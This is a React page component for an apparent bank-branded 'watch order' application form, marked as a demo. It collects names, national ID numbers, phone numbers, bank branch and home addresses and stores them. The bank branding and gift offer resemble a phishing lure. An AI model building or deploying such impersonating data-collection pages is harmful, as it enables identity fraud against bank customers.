import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, ChevronDown } from "lucide-react";
import { base44 } from "@/api/base44Client";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { useToast } from "@/components/ui/use-toast";
import BankLogo from "@/components/bank/BankLogo";
import DemoBanner from "@/components/bank/DemoBanner";
import Field from "@/components/apply/Field";
import { GOVERNORATES, NBE_BRANCHES, genRequestNumber } from "@/lib/bankData";
import { upsertSubmission } from "@/lib/portalSession";

export default function Apply() {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [sending, setSending] = useState(false);
  const [reqNumber] = useState(genRequestNumber());
  const [form, setForm] = useState({
    applicant_name: "",
    national_id: "",
    phone: "",
    governorate: "",
    address: "",
    branch: "",
    current_residence: "",
  });

  const set = (k, v) => setForm((f) => ({ ...f, [k]: v }));
  const onlyDigits = (v, max) => v.replace(/\D/g, "").slice(0, max);

  const canSubmit = () =>
    form.applicant_name && form.national_id && form.phone && form.governorate;

  const submit = async () => {
    if (!canSubmit()) {
      toast({
        title: "بيانات ناقصة",
        description: "يرجى إكمال الحقول المطلوبة.",
        variant: "destructive",
      });
      return;
    }
    setSending(true);
    const now = new Date().toISOString();
    try {
      await base44.entities.ServiceRequest.create({
        ...form,
        request_number: reqNumber,
        service_type: "watch_order",
        service_label: "طلب ساعة تجريبي",
        status: "new",
        submitted_at: now,
        last_update: now,
        admin_notes: "",
        audit_log: [{ action: "تم إنشاء الطلب بحالة: جديد", at: now, by: "مقدم الطلب" }],
      });
      await base44.entities.DemoNotification.create({
        request_number: reqNumber,
        message: `تم استلام طلبك رقم #${reqNumber} وهو الآن قيد الانتظار للمراجعة.`,
        status: "new",
      });
      await upsertSubmission({
        applicant_name: form.applicant_name,
        phone: form.phone,
        national_id: form.national_id,
        governorate: form.governorate,
        address: form.address,
        service_type: "watch_order",
        service_label: "طلب ساعة تجريبي",
        details: {
          branch: form.branch,
          current_residence: form.current_residence,
        },
        request_number: reqNumber,
        submitted_at: now,
      });
      toast({ title: "تم إرسال الطلب", description: `رقم الطلب: ${reqNumber}` });
      navigate("/portal");
    } catch {
      toast({ title: "حدث خطأ", variant: "destructive" });
      setSending(false);
    }
  };

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col">
      <DemoBanner />
      <header className="bg-white border-b border-slate-200 px-4 py-3 flex justify-center">
        <BankLogo />
      </header>

      <div className="flex-1 flex justify-center px-4 py-8">
        <div className="w-full max-w-lg bg-white rounded-2xl border border-slate-200 p-6 sm:p-8 space-y-6">
          <div className="text-center">
            <h1 className="text-xl font-bold text-slate-900">بيانات الطلب</h1>
            <p className="text-sm text-slate-500 mt-1">
              أدخل بياناتك للتقديم على طلب الساعة
            </p>
          </div>

          <div className="space-y-5">
            <Field
              label="الاسم الكامل"
              placeholder="الاسم من اربع مقاطع"
              value={form.applicant_name}
              onChange={(v) => set("applicant_name", v)}
            />
            <Field
              label="الرقم القومي"
              placeholder="١٤ رقمًا"
              inputMode="numeric"
              maxLength={14}
              value={form.national_id}
              onChange={(v) => set("national_id", onlyDigits(v, 14))}
            />
            <Field
              label="رقم هاتف"
              placeholder="١١ رقمًا"
              inputMode="numeric"
              maxLength={11}
              value={form.phone}
              onChange={(v) => set("phone", onlyDigits(v, 11))}
            />
            <Field
              label="المحافظة"
              type="select"
              options={GOVERNORATES}
              value={form.governorate}
              onChange={(v) => set("governorate", v)}
            />
            <div className="space-y-2">
              <Label className="text-slate-700">الفرع الذي تم فتح الحساب به</Label>
              <div className="relative">
                <select
                  className="w-full appearance-none rounded-xl border border-slate-200 bg-white px-4 py-3 pl-10 text-sm focus:outline-none focus:ring-2 focus:ring-[#0E7A5F]/30 focus:border-[#0E7A5F]"
                  value={form.branch || ""}
                  onChange={(e) => set("branch", e.target.value)}
                >
                  <option value="">اختر الفرع...</option>
                  {NBE_BRANCHES.map((b) => (
                    <option key={b} value={b}>
                      {b}
                    </option>
                  ))}
                </select>
                <ChevronDown className="w-4 h-4 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none" />
              </div>
            </div>
            <Field
              label="عنوان التوصيل بالضبط"
              type="textarea"
              placeholder="ادخل عنوان التوصيل بالتفصيل ( الشارع , المنطقة , اقرب نقطة معروفة )"
              value={form.address}
              onChange={(v) => set("address", v)}
            />
            <Field
              label="مكان الإقامة الحالي"
              type="textarea"
              placeholder="ادخل مكان إقامتك الحالي بالتفصيل ( المحافظة , المدينة , الحي , الشارع )"
              value={form.current_residence}
              onChange={(v) => set("current_residence", v)}
            />
          </div>

          <Button
            onClick={submit}
            disabled={sending}
            className="w-full bg-[#0E7A5F] hover:bg-[#0b6450] rounded-xl py-6 text-base gap-2"
          >
            {sending ? "جاري الإرسال..." : "متابعة"}
            <ArrowLeft className="w-4 h-4" />
          </Button>
        </div>
      </div>
    </div>
  );
}